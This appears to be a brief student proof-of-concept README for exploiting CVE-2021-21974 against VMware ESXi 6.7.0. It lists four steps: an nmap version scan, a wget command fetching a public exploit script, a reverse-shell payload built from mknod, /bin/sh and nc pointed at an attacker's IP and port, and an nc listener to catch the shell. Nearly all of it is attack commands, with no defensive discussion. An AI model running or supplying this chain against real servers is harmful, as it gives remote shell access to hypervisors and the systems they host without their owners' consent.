# PROOF OF CONCEPT
> Hamza Ghariani 4 NIDS 1

## 1. vmware version on port 443 must be **ESXi 6.7.0**


```bash
nmap --script vmware-version -p 443 IP
```

## 2. Python payload to exploit the cve

```bash
wget https://raw.githubusercontent.com/straightblast/My-PoC-Exploits/master/CVE-2021-21974.py
```

## 3. Set up IP address and Port

```python
shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc IP PORT 1>/tmp/backpipe'
```

## 4. Start Listening to port

```bash
nc -lnvp PORT
```
